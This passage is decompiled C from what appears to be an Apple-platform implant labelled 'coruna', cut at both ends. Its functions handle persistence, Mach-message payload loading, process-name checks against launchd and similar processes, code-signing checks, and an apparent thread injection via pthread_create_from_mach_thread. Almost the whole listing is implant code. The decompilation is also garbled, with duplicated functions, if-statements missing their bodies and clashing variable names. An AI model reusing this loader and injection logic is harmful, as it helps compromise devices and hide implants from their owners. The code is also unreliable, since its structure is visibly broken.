    }
    else {
      u = *(uint *)(off_3 + 1);
      if (((u < path_buf) || (CARRY4(tmp_buf,path_buf))) || (u < tmp_buf + path_buf))
      ptr = &k_persist_rodata_word_1f008;
      bootargs = addr + (unsigned long)path_buf;
      scratch = (unsigned long)tmp_buf;
      if (((((tmp_buf != 0) && (*(char *)(bootargs + (unsigned long)(tmp_buf - 1)) != '\0')) ||
           (u < region)) || (((plist & 3) != 0 || (plist + region < plist)))) ||
         ptr = &k_persist_rodata_word_1f008;
      serial = addr + (unsigned long)region;
      size = plist >> 2;
      host_info = (unsigned long)size;
      thread_attr = serial;
      if (((u < url_buf) || ((json_buf & 0xf) != 0)) ||
         ptr = &k_persist_rodata_word_1f008;
      serial_buf = addr + (unsigned long)url_buf;
      bootargs = (unsigned long)(json_buf >> 4);
      if ((((u < frame) || ((work & 3) != 0)) || (work + frame < work)) ||
         ptr = &k_persist_rodata_word_1f008;
      stack_guard = addr + (unsigned long)frame;
      thread_attr = (unsigned long)(work >> 2);
      if (((u < cache) || ((cache_20 & 3) != 0)) ||
         ptr = &k_persist_rodata_word_1f008;
      handle = addr + (unsigned long)cache;
      sa_new = (unsigned long)(cache_20 >> 2);
      sa_saved = handle;
      if (((u < cache_21) || (scratch = (unsigned long)cache_22 / 0x18, cache_22 % 0x18 != 0)) ||
         ptr = &k_persist_rodata_word_1f008;
      ptr = &k_persist_rodata_word_1f008;
      if (u < cache_22 + cache_21) goto cleanup;
      copy[2] = bootargs;
      *(uint *)(copy + 3) = tmp_buf;
      ptr = copy + 4;
      action = addr + (unsigned long)cache_21;
      block_ctx = scratch;
      coruna_memset(ptr,0,0x10);
      if (3 < plist) {
        off = coruna_call_webbookmarks_delete((unsigned long)size,0x10);
        if (off != 0) {
          ctx_val = 0;
          do {
            cache_23 = 0;
            coruna_memcpy(&cache_23,serial,4);
            ptr = (uint64_t *)0x1f00c;
            *(long *)(off + ctx_val) = copy[2] + (unsigned long)cache_23;
            ((long *)(off + ctx_val))[1] = 0;
            ctx_val = ctx_val + 0x10;
            serial = serial + 4;
          } while ((unsigned long)size * 0x10 - ctx_val != 0);
          *ptr = off;
          goto skip;
        }
next:
        ptr = (uint64_t *)0xad009;
        goto cleanup;
      }
      size = 0;
      *ptr = 0;
skip:
      serial = serial_buf;
      *(uint *)(copy + 5) = size;
      err = (int)bootargs;
      version = bootargs & 0xffffffff;
      if (((int)bootargs != 0) && (serial_buf == 0)) {
        ptr = (uint64_t *)0xad001;
        goto cleanup;
      }
      str = copy + 6;
      coruna_memset(str,0,0x10);
      if (err == 0) {
        *str = 0;
      }
      else {
        off = coruna_call_webbookmarks_delete(version,0x30);
        continue;
        ctx_val = 0;
        ptr = (uint64_t *)&UNK_0001f002;
        do {
          coruna_memcpy(&cache_23,serial,0x10);
          ptr = (uint64_t *)0x1f00c;
          base = copy[2];
          if (cache_26 == 0xff) {
            lppu11 = &PTR_s__000205b0;
          }
          else if (cache_26 == 0xfe) {
            lppu11 = &PTR_s__000205c0;
          }
          else {
            if (*(uint *)(copy + 5) <= (uint)cache_26) {
              ptr = (uint64_t *)0x1f00a;
              goto retry;
            }
            lppu11 = (uint8_t **)(*ptr + (unsigned long)(uint)cache_26 * 0x10);
          }
          if (*(uint *)(copy + 1) <= cache_23) goto retry;
          buf = (long *)(off + ctx_val);
          *buf = *copy + (unsigned long)cache_23;
          *(uint8_t *)(buf + 1) = host_info;
          buf[2] = base + (unsigned long)cache_25;
          buf[3] = (unsigned long)cache_24;
          buf[4] = (long)lppu11;
          *(uint8_t *)(buf + 5) = serial_buf;
          ctx_val = ctx_val + 0x30;
          serial = serial + 0x10;
        } while (version * 0x30 != ctx_val);
        *str = off;
      }
      *(int *)(copy + 7) = err;
      ptr = (uint64_t *)coruna_wire_offset_table(copy + 10,copy,stack_guard,work >> 2);
      if (((int)ptr != 0) ||
         (ptr = (uint64_t *)coruna_wire_offset_table(copy + 0xc,copy,handle,cache_20 >> 2),
         (int)ptr != 0)) goto cleanup;
      ptr = copy + 8;
      coruna_memset(ptr,0,0x10);
      if (cache_22 < 0x18) {
        scratch = 0;
        *ptr = 0;
      }
      else {
        off = coruna_call_webbookmarks_delete(scratch,0x18);
        ptr = (uint64_t *)0xad009;
        if (off == 0) goto cleanup;
        serial = 0;
        version = scratch;
        do {
          coruna_memcpy(&cache_23,addr + (unsigned long)cache_21 + serial,0x18);
          if (*(uint *)(copy + 1) <= cache_23) {
            ptr = (uint64_t *)&UNK_0001f002;
            goto retry;
          }
          str = (long *)(off + serial);
          *str = *copy + (unsigned long)cache_23;
          str[2] = cache_27;
          str[1] = coruna_cat(action,
                               coruna_cat(serial_buf,coruna_cat(host_info,coruna_u64_pack14((cache_26), (cache_25)))))
          ;
          serial = serial + 0x18;
          version = version - 1;
        } while (version != 0);
        *ptr = off;
      }
      ptr = (uint64_t *)0x0;
      *(int *)(copy + 9) = (int)scratch;
      *handle = (long)copy;
    }
    coruna_memset(&bootargs,0,0x60);
  }
  coruna_memset(&path_buf,0,0x30);
fail:
  coruna_memset(&path_buf,0,0x30);
  return ptr;
check_ok:
  ptr = (uint64_t *)0x1f00c;
retry:
  coruna_driver_free_ctx(off);
  goto cleanup;
}





uint8_t * coruna_wire_offset_table(long *handle,long *addr_2,long off_3,uint size)
{
  long handle;
  uint8_t *ptr;
  unsigned long u;
  uint scratch;
  
  ptr = (uint8_t *)0xad001;
  if (((handle != (long *)0x0) && (addr_2 != (long *)0x0)) && ((size == 0 || (off_3 != 0))))
  {
    coruna_memset(handle,0,0x10);
    if (size == 0) {
      ptr = (uint8_t *)0x0;
      *handle = 0;
      *(uint32_t *)(handle + 1) = 0;
    }
    else {
      handle = coruna_call_webbookmarks_delete((unsigned long)size,8);
      if (handle == 0) {
        ptr = (uint8_t *)0xad009;
      }
      else {
        u = 0;
        do {
          scratch = 0;
          coruna_memcpy(&scratch,off_3,4);
          if (*(uint *)(addr_2 + 1) <= scratch) {
            coruna_driver_free_ctx(handle);
            return &k_persist_rodata_word_1f001;
          }
          *(unsigned long *)(handle + u * 8) = *addr_2 + (unsigned long)scratch;
          u = u + 1;
          off_3 = off_3 + 4;
        } while (u < size);
        ptr = (uint8_t *)0x0;
        *handle = handle;
        *(uint *)(handle + 1) = size;
      }
    }
  }
  return ptr;
}





void coruna_pacia(void)
{
  return;
}





void coruna_persist_nop_2(void)
{
  return;
}





void coruna_persist_nop_3(void)
{
  return;
}





void coruna_persist_nop_4(void)
{
  return;
}
uint64_t coruna_return_zero(void)
{
  return 0;
}





void coruna_implant_indirect_call0(void (*indirect_target)
{
  (*indirect_target)();
  return;
}





void coruna_dyld_port_index(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_dyld_port_index(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[12];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4_c(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[4];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





void coruna_implant_indirect_call4(void (*indirect_target,uint32_t size,uint64_t val,long handle)
{
  uint32_t scratch[8];
  
  *(uint32_t *)((long)scratch + handle) = size;
  (*indirect_target)();
  return;
}





uint64_t coruna_persist_residual_43(long handle,long addr_2)
{
  uint64_t u;
  
  if (((handle != 0) && (addr_2 != 0)) && (k_persist_slot_9030 != (void (*)0x0)) {
    u = (*k_persist_slot_9030)();
    return u;
  }
  return 0xffffffffffffffff;
}





uint64_t coruna_return_minus_one(void)
{
  return 0xffffffffffffffff;
}





uint64_t coruna_pad_stub(void)
{
  return 0;
}





uint8_t * _end(void)
{
  uint8_t *ptr;
  short *lps2;
  int err;
  pid_t pid;
  uint u;
  long handle;
  unsigned long size;
  uint64_t in_x4;
  mach_port_name_t name;
  uint8_t *buf;
  uint8_t tag[16];
  uint64_t scratch;
  long bootargs;
  long thread_attr;
  short *host_info;
  long serial_buf;
  long action;
  short *block_ctx;
  long stack_guard;
  uint64_t sa_saved;
  void *sa_new;
  short *path_buf;
  long *tmp_buf;
  void (*region)(void);
  uint plist;
  pthread_t url_buf;
  short *json_buf;
  void *frame;
  void (*work)(void);
  uint cache;
  void (*cache_20)(void);
  long cache_21;
  uint64_t cache_22;
  uint32_t cache_23;
  uint64_t cache_24;
  uint32_t cache_25;
  long cache_26;
  short *cache_27;
  long cache_28;
  long cache_29;
  
  tag = (*(void (*)k_persist_chkstk_darwin_slot)();
  cache_29 = *(long *)k_persist_stack_chk_guard_slot;
  handle = _dlopen("/usr/lib/libSystem.B.dylib",0x10);
  size = 0;
  if (handle != 0) {
    size = _dlsym(handle,"vsyslog");
  }
  ptr = k_persist_mach_task_self_slot;
  buf = (uint8_t *)0x1e039;
  bootargs = 0;
  scratch = 0;
  host_info = (short *)0x0;
  thread_attr = 0;
  action = 0;
  serial_buf = 0;
  stack_guard = 0;
  block_ctx = (short *)0x0;
  sa_saved = 0;
  name = (mach_port_name_t)in_x4;
  k_persist_rodata_word_24588 = size;
  if (name + 1 < 2) {
    if (*(long *)k_persist_stack_chk_guard_slot == cache_29) {
      return buf;
    }
    ___stack_chk_fail();
  }
  buf = (uint8_t *)0x1e042;
  u = 0;
  if ((tag != 0) && (tag != 0)) {
    buf = (uint8_t *)coruna_persist_via_ctx_free((unsigned long)&scratch | 8,tag,tag);
    if ((int)buf == 0) {
      work = (void (*)0x0;
      json_buf = (short *)((unsigned long)json_buf & 0xffffffff00000000);
      scratch = coruna_u64_pack((8), (name));
      buf = (uint8_t *)coruna_mach_msg_destroy_a908(in_x4,&work,&json_buf);
      if ((int)buf == 0) {
        sa_saved = *(uint64_t *)(work + 0x30);
        if (*(int *)(work + 0x1c) + 1U < 2) {
          thread_attr = 0;
          host_info = (short *)0x0;
done:
          buf = (uint8_t *)coruna_bind_loader_create(&serial_buf,host_info,0,0,0,1);
          if ((int)buf != 0) goto cleanup;
          _bzero(&cache_21,0x1000);
          pid = _getpid();
          err = _proc_name(pid,&cache_21,0x1000);
          if (0 < err) {
            handle = 0;
            do {
              err = _strcasecmp((char *)&cache_21,
                                  *(char **)((long)&PTR_s_launchd_000205d0 + handle));
              if (err == 0) {
                buf = (uint8_t *)0xad001;
                if (bootargs == 0 || serial_buf == 0) goto cleanup;
                path_buf = (short *)0x0;
                frame = (void *)((unsigned long)frame & 0xffffffff00000000);
                buf = (uint8_t *)
                         (**(void (**)(bootargs + 0x18))
                                   (bootargs,0x90000,&path_buf,&frame);
                if (((int)buf == 0) &&
                   (buf = (uint8_t *)
                             (**(void (**)(serial_buf + 0x30))
                                       (serial_buf,path_buf,(unsigned long)frame & 0xffffffff,4,
                                        &action), (int)buf == 0)) {
                  cache_20 = (void (*)0x0;
                  buf = (uint8_t *)
                           (**(void (**)(action + 0x30))(action,"_driver",&cache_20);
                  if (((int)buf == 0) &&
                     (buf = (uint8_t *)(*cache_20)(&block_ctx), (int)buf == 0)) {
                    if (((block_ctx != (short *)0x0) && (*block_ctx == 2)) &&
                       (1 < (ushort)block_ctx[1])) {
                      buf = (uint8_t *)coruna_bind_loader_create(&stack_guard,block_ctx,0,bootargs,0,1);
                      if ((int)buf != 0) goto cleanup;
                      goto check_ok;
                    }
                    block_ctx = (short *)0x0;
                    buf = (uint8_t *)0xad00a;
                  }
                }
                if ((int)buf != 0x7003) goto cleanup;
                goto check_ok;
              }
              handle = handle + 8;
            } while (handle != 400);
          }
          block_ctx = (short *)0x0;
check_ok:
          handle = stack_guard;
          if ((stack_guard == 0) && (handle = serial_buf, serial_buf == 0)) {
            buf = (uint8_t *)0xad022;
            handle = 0;
          }
          else {
            cache_21 = 0;
            buf = (uint8_t *)
                     (**(void (**)(handle + 0x30))
                               (handle,work + 0x40,*(uint32_t *)(work + 0x3c),
                                *(uint64_t *)(work + 0x30),&cache_21);
            handle = cache_21;
            if ((int)buf != 0) {
              handle = 0;
            }
          }
        }
        else {
          cache_21 = 0;
          buf = (uint8_t *)
                   coruna_mach_port_mod_refs_1068c(&cache_21,*(int *)(work + 0x1c),
                                *(uint32_t *)(work + 0x38));
          if ((int)buf == 0) {
            path_buf = (short *)0x0;
            buf = (uint8_t *)coruna_macho_iface_create(cache_21,&path_buf);
            if ((int)buf == 0) {
              host_info = path_buf;
              thread_attr = cache_21;
              goto done;
            }
            if (cache_21 != 0) {
              coruna_mach_port_deallocate_1075c();
            }
          }
cleanup:
          handle = 0;
        }
        if (1 < *(mach_port_name_t *)(work + 0x1c) + 1) {
          _mach_port_deallocate(*(ipc_space_t *)ptr,*(mach_port_name_t *)(work + 0x1c));
        }
        _bzero(work + 0x40,(unsigned long)*(uint *)(work + 0x3c));
        _free(work);
        if ((int)buf == 0) {
          if (handle == 0) {
            buf = (uint8_t *)0xad001;
          }
          else {
            cache_20 = (void (*)0x0;
            cache = 0;
            frame = (void *)0x0;
            work = (void (*)0x0;
            cache_21 = coruna_u64_pack((cache_21), (0x10001));
            cache_22 = *(uint64_t *)(handle + 0x10);
            cache_23 = *(uint32_t *)(handle + 0x18);
            cache_24 = *(uint64_t *)(handle + 0x20);
            cache_26 = serial_buf;
            if (stack_guard != 0) {
              cache_26 = stack_guard;
            }
            cache_27 = host_info;
            if (block_ctx != (short *)0x0) {
              cache_27 = block_ctx;
            }
            size = scratch & 0xffffffff;
            cache_25 = (uint32_t)scratch;
            cache_28 = bootargs;
            scratch = coruna_u64_pack((9), ((uint32_t))scratch);
            buf = (uint8_t *)
                     coruna_mach_msg_destroy_aa00(size,&cache_20,&cache,&frame,&work);
            if ((int)buf == 0) {
              json_buf = (short *)0x0;
              err = (**(void (**)(handle + 0x30))(handle,frame,&json_buf);
              lps2 = json_buf;
              buf = &UNK_00005005;
              if ((err == 0) && (json_buf != (short *)0x0)) {
                u = *(uint *)(cache_20 + 0x1c);
                _bzero(frame,(unsigned long)*(uint *)(cache_20 + 0x18));
                if (u != 0) {
                  _memmove(cache_20,work,(unsigned long)u);
                  work = cache_20;
                }
                coruna_mach_port_deallocate_a820(scratch & 0xffffffff,0,10,0,0);
                url_buf = (pthread_t)0x0;
                tmp_buf = &cache_21;
                path_buf = lps2;
                region = (void (*)0x0;
                if (u != 0) {
                  region = work;
                }
                plist = u;
                err = _pthread_create(&url_buf,(pthread_attr_t *)0x0,(void **)coruna_nop_stub,
                                        &path_buf);
                u = 0x1d002;
                if (err == 0) {
                  sa_new = (void *)0x0;
                  err = _pthread_join(url_buf,&sa_new);
                  u = (uint)sa_new;
                  if (err != 0) {
                    u = 0x1d003;
                  }
                }
                buf = (uint8_t *)(unsigned long)u;
                scratch = coruna_u64_pack((0x10), ((uint32_t))scratch);
              }
              _bzero(cache_20,(unsigned long)cache);
              _free(cache_20);
            }
          }
          if (((byte)sa_saved >> 5 & 1) == 0) {
            (**(void (**)(handle + 0x28))(handle);
          }
        }
      }
      if (stack_guard != 0) {
        (**(void (**)(stack_guard + 0x10))();
      }
      if (block_ctx != (short *)0x0) {
        (**(void (**)(block_ctx + 8))();
      }
      if (action != 0) {
        (**(void (**)(action + 0x28))();
      }
      if (serial_buf != 0) {
        (**(void (**)(serial_buf + 0x10))();
      }
      if (host_info != (short *)0x0) {
        (**(void (**)(host_info + 8))();
      }
      if (thread_attr != 0) {
        coruna_mach_port_deallocate_1075c();
      }
      coruna_ctx_free(bootargs);
      u = scratch;
      bootargs = 0;
      host_info = (short *)0x0;
      thread_attr = 0;
      action = 0;
      serial_buf = 0;
      stack_guard = 0;
      block_ctx = (short *)0x0;
      sa_saved = 0;
      scratch = (unsigned long)scratch << 0x20;
    }
    else {
      u = scratch;
    }
  }
  coruna_mach_port_deallocate_a820(in_x4,0,u,buf,1);
  u = _mach_port_deallocate(*(ipc_space_t *)ptr,name);
  size = (unsigned long)u;
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == cache_29) {
    return buf;
  }
  ___stack_chk_fail(size);
}





long coruna_nop_stub(uint64_t *val)
{
  int err;
  long handle;
  
  handle = 0xad001;
  if (val != (uint64_t *)0x0) {
    if ((void (*)*val == (void (*)0x0) {
      handle = 0xad014;
    }
    else {
      err = (*(void (*)*val)(val[1],val[2],*(uint32_t *)(val + 3));
      handle = (long)err;
    }
  }
  return handle;
}





long coruna_persist_residual_44(uint64_t *val)
{
  int err;
  long handle;
  
  handle = 0xad001;
  if (val != (uint64_t *)0x0) {
    if ((void (*)*val == (void (*)0x0) {
      handle = 0xad014;
    }
    else {
      err = (*(void (*)*val)(val[1],val[2],*(uint32_t *)(val + 3));
      handle = (long)err;
    }
  }
  return handle;
}





unsigned long coruna_mach_port_create(uint64_t arg,uint64_t val,uint64_t n,uint64_t *m,
                  uint32_t *p)

{
  uint u;
  uint size;
  uint8_t *ptr;
  mach_port_name_t lm4;
  kern_return_t lk5;
  unsigned long tag;
  mach_port_name_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  
  ptr = k_persist_mach_task_self_slot;
  u = (int)arg + 1;
  if ((u < 2 || m == (uint64_t *)0x0) || p == (uint32_t *)0x0) {
    size = 0xad001;
    if (u < 2) {
      size = 0x1e039;
    }
    tag = (unsigned long)size;
  }
  else {
    scratch = 0;
    lk5 = _mach_port_allocate(*(ipc_space_t *)k_persist_mach_task_self_slot,1,&scratch);
    tag = 0x1e023;
    if (lk5 == 0) {
      tag = coruna_mach_port_deallocate_a820(arg,scratch,val,n,0);
      lm4 = scratch;
      if ((int)tag == 0) {
        if (scratch + 1 < 2) {
          tag = 0xad001;
        }
        else {
          thread_attr = 0;
          bootargs = 0;
          tag = coruna_mach_msg_destroy_ab30(scratch,0x18,4,30000,&thread_attr,&bootargs);
          if ((int)tag == 0x1e03b) {
            tag = coruna_mach_msg_destroy_ab30(lm4,bootargs,0,0,&thread_attr,&bootargs);
          }
          if ((int)tag == 0) {
            *m = thread_attr;
            *p = bootargs;
          }
        }
      }
      _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
    }
  }
  return tag;
}





uint32_t
uint32_t coruna_mach_port_deallocate_a820(mach_port_t port,mach_port_name_t arg,uint32_t size,uint32_t flags_2)
{
  mach_msg_return_t lm1;
  uint32_t u;
  mach_msg_header_t scratch;
  uint32_t bootargs;
  uint32_t scratch;
  
  if (port + 1 < 2) {
    u = 0x1e039;
  }
  else {
    scratch.msgh_bits = 0x1413;
    if (arg + 1 < 2) {
      scratch.msgh_bits = 0x13;
    }
    scratch = k_persist_rodata_word_1ef60;
    scratch.msgh_size = 0x20;
    scratch.msgh_remote_port = port;
    scratch.msgh_local_port = arg;
    bootargs = size;
    scratch = flags_2;
    lm1 = _mach_msg(&scratch,0x11,0x20,100,0,100,0);
    if (lm1 == 0) {
      u = 0;
    }
    else if (lm1 == 0x10) {
      u = 0x1f037;
      if (1 < arg + 1) {
        _mach_port_deallocate(*(ipc_space_t *)k_persist_mach_task_self_slot,arg);
      }
    }
    else {
      u = 0x1f037;
      if (lm1 == 0x10000003) {
        u = 0x1f036;
      }
    }
  }
  return u;
}





uint64_t coruna_mach_msg_destroy_a908(uint64_t val,uint64_t *id_2,uint *size)
{
  uint u;
  uint64_t size;
  uint scratch;
  mach_msg_header_t *bootargs;
  
  bootargs = (mach_msg_header_t *)0x0;
  scratch = 0;
  size = 0xad001;
  if (((id_2 != (uint64_t *)0x0) && (size != (uint *)0x0)) &&
     (size = coruna_mach_port_create(val,8,0,&bootargs,&scratch), (int)size == 0)) {
    size = 0x1e03a;
    if (scratch < 0x40) {
      if (bootargs == (mach_msg_header_t *)0x0) {
        return 0x1e03a;
      }
    }
    else if (((((bootargs->msgh_id == 1) && ((int)bootargs->msgh_bits < 0)) &&
              ((bootargs[2].msgh_local_port != 0 &&
               ((bootargs[1].msgh_bits == 1 &&
                (*(char *)((long)&bootargs[1].msgh_local_port + 3) == '\0')))))) &&
             (u = bootargs[2].msgh_local_port + 0x40, 0x40 < u)) && (u <= scratch)) {
      *id_2 = bootargs;
      *size = scratch;
      return 0;
    }
    _mach_msg_destroy(bootargs);
    _bzero(bootargs,(unsigned long)scratch);
    _free(bootargs);
  }
  return size;
}





uint64_t
uint64_t coruna_mach_msg_destroy_aa00(uint64_t val,uint64_t *id_2,uint *size,int64_t *arg,int64_t *arg)
{
  uint u;
  mach_port_t *lpm2;
  long handle;
  uint size;
  uint version;
  uint64_t port;
  uint scratch;
  mach_msg_header_t *bootargs;
  
  bootargs = (mach_msg_header_t *)0x0;
  scratch = 0;
  port = 0xad001;
  if (((id_2 != (uint64_t *)0x0) && (size != (uint *)0x0)) &&
     (port = coruna_mach_port_create(val,9,0,&bootargs,&scratch), (int)port == 0)) {
    port = 0x1e03a;
    if (scratch < 0x20) {
      if (bootargs == (mach_msg_header_t *)0x0) {
        return 0x1e03a;
      }
    }
    else if ((bootargs->msgh_id == 2) && (-1 < (int)bootargs->msgh_bits)) {
      size = bootargs[1].msgh_bits;
      if ((1 < size) && (u = size + 0x20, 0x20 < u)) {
        version = bootargs[1].msgh_size;
        if ((!CARRY4(version,u)) && (version + u <= scratch)) {
          lpm2 = &bootargs[1].msgh_remote_port;
          handle = 0;
          if (version != 0) {
            handle = (long)lpm2 + (unsigned long)size;
          }
          if (*(char *)((long)lpm2 + (unsigned long)(size - 1)) == '\0') {
            *id_2 = bootargs;
            *size = scratch;
            if (arg != (long *)0x0) {
              *arg = (long)lpm2;
            }
            if (arg == (long *)0x0) {
              return 0;
            }
            *arg = handle;
            return 0;
          }
        }
      }
    }
    _mach_msg_destroy(bootargs);
    _bzero(bootargs,(unsigned long)scratch);
    _free(bootargs);
  }
  return port;
}





uint64_t
uint64_t coruna_mach_msg_destroy_ab30(mach_port_name_t arg,uint size,uint flags_2,mach_msg_timeout_t arg_x, uint64_t *val,uint *count_3)
{
  uint rcv_size;
  uint u;
  mach_msg_header_t *msg;
  uint64_t size;
  
  if (size < 0x18) {
    return 0xad001;
  }
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (count_3 == (uint *)0x0) {
    return 0xad001;
  }
  rcv_size = size + 8;
  msg = _calloc(1,(unsigned long)rcv_size);
  if (msg == (mach_msg_header_t *)0x0) {
    return 0xad009;
  }
  size = 0x1e021;
  u = _mach_msg(msg,flags_2 | 0x102,0,rcv_size,arg,arg_x,0);
  if (u == 0x10004004) {
    u = msg->msgh_size;
    if (u - 0x18 < 0x63fffe9) {
      *val = 0;
      *count_3 = u;
      size = 0x1e03b;
      _bzero(msg,(unsigned long)rcv_size);
      _free(msg);
      return size;
    }
    _mach_msg(msg,0x102,0,rcv_size,arg,0,0);
  }
  else {
    _bzero(msg,(unsigned long)rcv_size);
    _free(msg);
    return size;
    if (u != 0) {
      if ((u & 0xfffffffb) == 0x10004008) {
        _mach_msg_destroy(msg);
      }
      _bzero(msg,(unsigned long)rcv_size);
      _free(msg);
      return size;
    }
    u = msg->msgh_size;
    if ((0x17 < u) && (u <= size)) {
      *val = msg;
      *count_3 = u;
      return 0;
    }
    _mach_msg_destroy(msg);
  }
  size = 0x1e03a;
fail:
  _bzero(msg,(unsigned long)rcv_size);
  _free(msg);
  return size;
}





uint64_t coruna_mach_port_deallocate(uint64_t *val)
{
  uint64_t u;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    u = coruna_loader_ctx_destroy(val[1]);
    if (1 < *(mach_port_name_t *)((long)val + 0x1c) + 1) {
      _mach_port_destroy(*(ipc_space_t *)k_persist_mach_task_self_slot,
                         *(mach_port_name_t *)((long)val + 0x1c));
    }
    if (1 < *(mach_port_name_t *)(val + 4) + 1) {
      _mach_port_deallocate(*(ipc_space_t *)(val + 2),*(mach_port_name_t *)(val + 4));
    }
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
  }
  return u;
}





unsigned long coruna_mach_port_deallocate(uint64_t *arg,long val,uint64_t n,long m,int p,
                  uint32_t q)

{
  uint u;
  uint size;
  long *ptr;
  ipc_space_t task;
  unsigned long type_id;
  uint64_t host_info;
  long serial_buf;
  uint32_t action;
  unsigned long block_ctx;
  
  type_id = 0xad001;
  if (((arg != (uint64_t *)0x0) && (val != 0)) && (m != 0)) {
    task = (ipc_space_t)n;
    if (task + 1 < 2) {
      type_id = 0x1e009;
    }
    else {
      if (p + 1U < 2) {
        block_ctx = block_ctx & 0xffffffffffffff00;
        size = coruna_csops(&block_ctx);
        if (size != 0) {
          u = 0x1e037;
          if (size != 0x12017) {
            u = size;
          }
          return (unsigned long)u;
        }
        if ((char)block_ctx != '\0') {
          return 0x1e037;
        }
      }
      ptr = _calloc(1,0x28);
      if (ptr == (long *)0x0) {
        type_id = 0xad009;
      }
      else {
        host_info = 0;
        type_id = coruna_mach_port_destroy((long)&host_info + 4,n,&host_info);
        if ((int)type_id == 0) {
          block_ctx = 0;
          action = 0;
          type_id = (**(void (**)(m + 0x18))(m,0xf0000,&block_ctx,&action);
          if ((int)type_id == 0) {
            serial_buf = 0;
            type_id = coruna_persist_via_macho_open_image_2(val,n,block_ctx,action,0,&serial_buf);
            if ((int)type_id == 0) {
              *ptr = m;
              ptr[1] = serial_buf;
              *(mach_port_name_t *)((long)ptr + 0x1c) = host_info;
              *(mach_port_name_t *)(ptr + 4) = (mach_port_name_t)host_info;
              *(ipc_space_t *)(ptr + 2) = task;
              *(int *)((long)ptr + 0x14) = p;
              *(uint32_t *)(ptr + 3) = q;
              *arg = ptr;
              return type_id;
            }
          }
          _mach_port_deallocate(task,(mach_port_name_t)host_info);
          if (1 < host_info + 1) {
            _mach_port_destroy(*(ipc_space_t *)k_persist_mach_task_self_slot,host_info);
          }
        }
        _free(ptr);
      }
    }
  }
  return type_id;
}





unsigned long coruna_run_end_last(long *arg,long val,int n,unsigned long m,char *p,long q,
                  int r,uint32_t *s)

{
  uint dataCnt;
  uint u;
  uint32_t size;
  uint8_t *ptr;
  int status;
  uint port;
  int flags;
  kern_return_t lk7;
  unsigned long type_id_8;
  long off;
  uint64_t *data;
  void *buf;
  size_t ls11;
  unsigned long type_id_9;
  uint64_t type_id_10;
  unsigned long type_id_11;
  long *str;
  long stack_guard;
  mach_vm_address_t sa_saved;
  uint32_t sa_new;
  mach_vm_address_t path_buf;
  mach_vm_address_t tmp_buf;
  uint region;
  void *plist;
  uint url_buf;
  void *json_buf;
  long frame;
  long work;
  pthread_attr_t cache;
  long cache_20;
  
  cache_20 = *(long *)k_persist_stack_chk_guard_slot;
  if (((((arg == (long *)0x0) || (val == 0)) || (n == 0)) ||
      ((p == (char *)0x0 || (*p == '\0')))) || ((q == 0) == (r != 0))) {
    type_id_8 = 0xad001;
    if (*(long *)k_persist_stack_chk_guard_slot == cache_20) {
    return type_id_8;
    }
    ___stack_chk_fail();
  }
  sa_new = 0;
  type_id_9 = m >> 3 & 1;
  if (k_persist_rodata_word_1ef68 <= *(double *)k_persist_dyldversionnumber_slot) {
    type_id_9 = m >> 3 & 1 | 2;
  }
  status = coruna_set_priority((int)arg[2],0xffffffec,&sa_new);
  type_id_8 = coruna_port_kernel_object((int)arg[2]);
  if (((int)type_id_8 == 0) && (type_id_8 = coruna_task_exc_guard((int)arg[2]), (int)type_id_8 == 0)) {
    frame = 0;
    work = 0;
    port = coruna_lookup_export(arg[1],"_last",&work);
    if (port == 0) {
      port = coruna_lookup_export(arg[1],"_end",&frame);
    }
    if (((port == 0) && (work != 0)) && (frame != 0)) {
      off = arg[1];
      if (off == 0) {
        type_id_8 = 0xad001;
      }
      else {
        type_id_10 = *(uint64_t *)(off + 0x40);
        size = *(uint32_t *)(off + 0x48);
        json_buf = (void *)0x0;
        url_buf = 0;
        cache.__sig = 0;
        plist = (void *)((unsigned long)plist & 0xffffffff00000000);
        type_id_8 = coruna_export_name_table(off,&cache,&plist);
        if ((int)type_id_8 == 0) {
          off = arg[1];
          type_id_8 = 0xad001;
          if (off != 0) {
            type_id_8 = coruna_fixup_apply(*(uint64_t *)(off + 0x40),*(uint32_t *)(off + 0x48),
                                 cache.__sig,(unsigned long)plist & 0xffffffff,
                                 *(uint64_t *)(off + 0xd8),*(uint32_t *)(off + 0xe0),
                                 *(uint64_t *)(off + 200),*(uint32_t *)(off + 0xd0),
                                 *(uint64_t *)(off + 0x140),&json_buf,&url_buf);
          }
          if ((void *)cache.__sig != (void *)0x0) {
            _free((void *)cache.__sig);
          }
          if ((int)type_id_8 == 0) {
            plist = (void *)0x0;
            region = 0;
            type_id_8 = (**(void (**)(*arg + 0x20))(*arg,&plist,&region);
            u = url_buf;
            port = region;
            if ((int)type_id_8 == 0) {
              dataCnt = url_buf + region + 0x90;
              type_id_11 = (unsigned long)dataCnt;
              data = _calloc(1,type_id_11);
              if (data == (uint64_t *)0x0) {
                stack_guard = 0;
                sa_saved = 0;
                dataCnt = 0;
                type_id_8 = 0xad009;
              }
              else {
                path_buf = 0;
                tmp_buf = 0;
                coruna_persist_trampoline_00010010(data + 0x12,json_buf,u);
                coruna_persist_trampoline_00010010((long)data + (unsigned long)(url_buf + 0x90),plist,region);
                *data = type_id_10;
                *(uint32_t *)(data + 1) = size;
                data[2] = 0;
                *(uint *)(data + 3) = dataCnt;
                data[4] = type_id_10;
                *(uint32_t *)(data + 5) = size;
                *(uint32_t *)(data + 6) = 0x90;
                *(uint *)((long)data + 0x34) = url_buf;
                off = arg[4];
                data[8] = frame;
                *(uint *)(data + 9) = url_buf + 0x90;
                *(uint *)((long)data + 0x4c) = region;
                *(int *)(data + 10) = (int)off;
                data[0xb] = type_id_9;
                off = _dlsym(0xfffffffffffffffe,"pthread_create_from_mach_thread");
                str = data + 0xc;
                *str = off;
                if (off == 0) {
